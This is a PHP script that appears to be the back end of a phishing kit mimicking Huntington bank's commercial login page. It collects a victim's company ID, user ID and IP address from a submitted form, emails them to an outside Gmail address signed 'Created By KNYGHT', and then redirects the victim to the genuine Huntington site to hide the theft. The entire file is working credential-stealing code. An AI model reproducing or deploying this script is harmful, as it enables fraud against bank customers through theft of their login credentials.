<?php
$ip = getenv("REMOTE_ADDR");
$message  = "--------------- Huntington login Commercial  --------------\n";
$message .= "Company ID : ".$_POST['companyid']."\n";
$message .= "User ID : ".$_POST['userid']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By KNYGHT-----------------\n";
$send = "payuupal@gmail.com";
$subject = "huntington";
$headers = "From: KNYGHT<comp>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send, $subject, $message); 
header("Location: https://www.huntington.com/");
	  

?>